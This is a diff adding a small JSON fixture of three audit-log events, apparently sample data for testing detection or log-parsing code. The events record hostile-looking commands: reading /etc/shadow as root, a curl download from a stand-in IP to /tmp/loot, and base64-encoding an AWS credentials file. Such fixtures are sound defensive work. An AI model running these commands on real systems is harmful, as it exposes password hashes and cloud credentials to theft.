@@ -1,0 +1,32 @@
+[
+  {
+    "time": "2021-07-18T12:29:23.72Z",
+    "source": "laurel",
+    "image": "/usr/bin/cat",
+    "commandLine": "cat /etc/shadow",
+    "parentImage": "/usr/bin/bash",
+    "targetFilename": "/etc/shadow",
+    "user": "root",
+    "currentDirectory": "/root"
+  },
+  {
+    "time": "2021-07-18T12:29:24Z",
+    "source": "laurel",
+    "image": "/usr/bin/curl",
+    "commandLine": "curl -s http://192.0.2.1/x -o /tmp/loot",
+    "parentImage": "",
+    "targetFilename": "",
+    "user": "u",
+    "currentDirectory": "/home/u"
+  },
+  {
+    "time": "2021-07-18T12:29:25.5Z",
+    "source": "laurel",
+    "image": "/usr/bin/base64",
+    "commandLine": "base64 /home/u/.aws/credentials",
+    "parentImage": "",
+    "targetFilename": "",
+    "user": "1000",
+    "currentDirectory": ""
+  }
+]
